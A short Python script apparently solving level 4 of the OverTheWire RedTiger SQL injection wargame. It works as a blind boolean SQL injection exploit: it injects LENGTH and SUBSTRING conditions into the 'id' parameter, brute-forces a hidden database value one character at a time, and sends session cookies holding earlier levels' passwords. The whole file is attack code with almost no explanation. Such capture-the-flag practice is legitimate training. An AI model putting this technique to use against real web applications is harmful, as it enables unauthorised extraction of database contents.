import requests
import string

header = { 'Cookie': "level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head"}

TARGET_URL = "https://redtiger.labs.overthewire.org/level4.php"

payload1 = {"id":1}

response = requests.get(TARGET_URL, headers=header, params=payload1)
# print(response.text)

QUERY = "SELECT keyword FROM level4_secret LIMIT 1"

# find length of the secret value, Hit and trial, tried >10, >20, >30(false), >25(false), length between 20-25, =21(true)
payload2 = {"id": f'1 AND LENGTH(({QUERY}))=21-- /'}
response = requests.get(TARGET_URL, headers=header, params=payload2)
# print(response.text)

secret_length = 21
secret_value = ""

for i in range(1, secret_length+1):
    # brute force each character
    for ch in string.printable:
        payload3 = {"id": f'1 AND SUBSTRING(({QUERY}), {i}, 1)=\'{ch}\'-- /'}
        response = requests.get(TARGET_URL, headers=header, params=payload3)
        print("Processing")
        if "Query returned 1 rows" in response.text:
            print(f"\n{ch}")
            secret_value += ch
            break

print(f"The secret key is {secret_value}")
